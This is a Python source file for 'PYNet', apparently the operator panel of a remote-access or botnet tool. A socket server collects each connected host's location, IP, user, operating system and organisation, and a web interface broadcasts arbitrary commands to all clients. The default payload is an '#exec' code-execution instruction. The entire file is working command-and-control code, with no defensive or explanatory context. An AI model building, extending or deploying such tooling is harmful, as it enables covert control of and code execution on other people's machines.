from dotenv import load_dotenv
from datetime import datetime
from nicegui import ui
import threading
import socket
import sys
import os


def load_config():
    try:
        load_dotenv("config.env")
        socket_host = os.getenv("SOCKET_HOST")
        socket_port = int(os.getenv("SOCKET_PORT"))
        web_host = os.getenv("WEB_HOST")
        web_port = int(os.getenv("WEB_PORT"))
        return socket_host, socket_port, web_host, web_port
    except Exception as e:
        raise ValueError(f"Error loading config: {e}")


def handle_client(client_socket, client_address):
    while True:
        try:
            data = client_socket.recv(1024)
            log.push(f"[{datetime.now():%X}] RECEIVE    {client_address}: {data}")
        except ConnectionResetError:
            for client in rows:
                if client["ip"] == f"{client_address[0]}:{client_address[1]}":
                    rows.remove(client)

            if client_socket in clients:
                clients.remove(client_socket)
            break
        except Exception as e:
            log.push(f"[{datetime.now():%X}] ERROR      {client_address}: {data}")
            break

    client_socket.close()


def socket_server(socket_host, socket_port):
    global clients
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (socket_host, socket_port)

    clients = []

    server_socket.bind(server_address)
    server_socket.listen()
    print(f"Socket is listening on {socket_host}:{socket_port}")

    while True:
        try:
            client_socket, client_address = server_socket.accept()
            log.push(f"[{datetime.now():%X}] CONNECTION {client_address}")

            data = client_socket.recv(1024)
            log.push(f"[{datetime.now():%X}] RECEIVE    {client_address}: {data}")
            data = data.decode().split("\n")
            rows.append(
                {
                    "location": data[0],
                    "ip": f"{client_address[0]}:{client_address[1]}",
                    "user": data[2],
                    "os": data[3],
                    "org": data[4],
                }
            )

            clients.append(client_socket)

            thread = threading.Thread(
                target=handle_client, args=(client_socket, client_address)
            )
            thread.start()
        except Exception as e:
            print(f"Error: {e}")


def web_server(web_host, web_port):
    global rows, log
    columns = [
        {"name": "location", "label": "Location", "field": "location", "align": "center"},
        {"name": "ip", "label": "IP Address", "field": "ip", "align": "center"},
        {"name": "user", "label": "User", "field": "user", "align": "center"},
        {"name": "os", "label": "Operating System", "field": "os", "align": "center"},
        {"name": "org", "label": "Organisation", "field": "org", "align": "center"},
    ]

    rows = []

    ui.table(columns=columns, rows=rows, pagination=10).classes("w-full")

    def send_data():
        data = data_input.value
        for client in clients:
            try:
                client.sendall(data.encode())
                client_address = client.getpeername()
                log.push(
                    f"[{datetime.now():%X}] SEND       {client_address}: {data.encode()}"
                )
            except:
                pass

    data_input = ui.textarea("Data", value="#exec\nprint('Hello')").classes("w-full")
    ui.button(text="SEND", on_click=send_data).classes("w-full")

    log = ui.log().classes("w-full")
    log.push(f"[{datetime.now():%X}] LISTEN     ('{socket_host}', {socket_port})")

    ui.run(
        host=web_host,
        port=web_port,
        title="PYNet",
        favicon="favicon.png",
        dark=True,
        show=False,
    )


if __name__ in {"__main__", "__mp_main__"}:
    try:
        socket_host, socket_port, web_host, web_port = load_config()
    except ValueError as e:
        print(e)
        input("Press ENTER to exit... ")
        sys.exit(1)

    web_server(web_host, web_port)

    socket_thread = threading.Thread(
        target=socket_server, args=(socket_host, socket_port)
    )
    socket_thread.start()
